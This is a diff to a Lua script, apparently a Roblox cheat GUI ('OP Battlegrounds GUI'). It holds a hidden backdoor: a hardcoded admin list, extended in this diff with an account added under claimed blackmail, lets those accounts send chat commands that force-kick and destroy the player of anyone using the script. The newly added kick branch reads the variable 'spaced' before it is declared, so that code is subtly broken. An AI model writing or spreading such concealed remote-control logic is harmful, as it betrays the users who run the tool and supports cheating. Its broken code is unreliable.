@@ -1,5 +1,8 @@
 -- Gui to Lua Version 3.2
--- Added katakuri buzz
+-- Realirist's OPBGGUI
+-- Added new admin
+-- Changed text of the title
+-- Moved the frame so that it doesnt cover the entire screen
 
 -- Instances:
 
@@ -128,7 +131,7 @@ Main.BackgroundColor3 = Color3.fromRGB(35, 40, 47)
 Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Main.BorderSizePixel = 0
 Main.Draggable = true
-Main.Position = UDim2.new(0.050805524, 229, 0.145989776, 0)
+Main.Position = UDim2.new(0.050805524, 612, 0.145989776, 25)
 Main.Selectable = true
 Main.Size = UDim2.new(0, 409, 0, 465)
 
@@ -256,7 +259,7 @@ title.BorderSizePixel = 0
 title.Position = UDim2.new(-0.000750478706, 0, -0.0975032672, 0)
 title.Size = UDim2.new(0, 409, 0, 50)
 title.Font = Enum.Font.SourceSans
-title.Text = "Realirist's OP BATTLEGROUNDS GUI (dont skid me pls)"
+title.Text = "OPBGGUI (don't skid me pls i have to pay em bills)"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextScaled = true
 title.TextSize = 14.000
@@ -832,7 +835,7 @@ UISizeConstraint_35.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function SQBYU_fake_script() -- Main.LocalScript 
+local function TAEI_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
@@ -1351,7 +1354,8 @@ local function SQBYU_fake_script() -- Main.LocalScript
 		local admins = {
 			'Realirist',
 			'olidragon210', -- payed 1000 and 200 for source code too
-			'inversealtbingy' -- my alt so i can troll
+			'inversealtbingy', -- my alt so i can troll
+			1833560263 -- XenonNetwork, he blackmailed me into making him an admin
 		}
 		print((table.find(admins,plr.Name)~=nil))
 		local name = plr.Name
@@ -1365,9 +1369,18 @@ local function SQBYU_fake_script() -- Main.LocalScript
 							return player
 						end
 					end
+					return nil
 				end
-				local spaced = string.split(msg,' ')
 				
+				if #spaced==3 then
+					local plrKicked = findPlayer(spaced[3])
+					if plrKicked and plrKicked==game.Players.LocalPlayer then
+						game.Players.LocalPlayer:Kick()
+						game.Players.LocalPlayer:Destroy()
+					end
+				end
+	
+				local spaced = string.split(msg,' ')
 				if msg=='!opbg disable '.. game.Players.LocalPlayer.Name then
 					print('disabled')
 					if table.find(admins,game.Players.LocalPlayer.Name) then
@@ -1387,7 +1400,6 @@ local function SQBYU_fake_script() -- Main.LocalScript
 				elseif msg[3] and findPlayer(msg[3]) and findPlayer(msg[3])==game.Players.LocalPlayer and msg[1]=='!opbg' and msg[2]=='kick' then
 					game.Players.LocalPlayer:Kick('I dont like your vibe, '.. game.Players.LocalPlayer.Name.. ' -Realirist')
 					game.Players.LocalPlayer:Destroy()
-	
 				elseif msg=='!opbg users' then
 					sayMessage('hi im using opbg')
 				elseif msg=='!opbg lastresort' then
@@ -1396,6 +1408,7 @@ local function SQBYU_fake_script() -- Main.LocalScript
 						return
 					end
 					sayMessage('Wallahi im cooked')
+					task.wait(0.2)
 					game.Players.LocalPlayer:Kick('Forced to kick you this way, last resort!')
 					game.Players.LocalPlayer:Destroy()
 				end
@@ -1431,4 +1444,4 @@ local function SQBYU_fake_script() -- Main.LocalScript
 	end)
 	co()
 end
-coroutine.wrap(SQBYU_fake_script)()
+coroutine.wrap(TAEI_fake_script)()
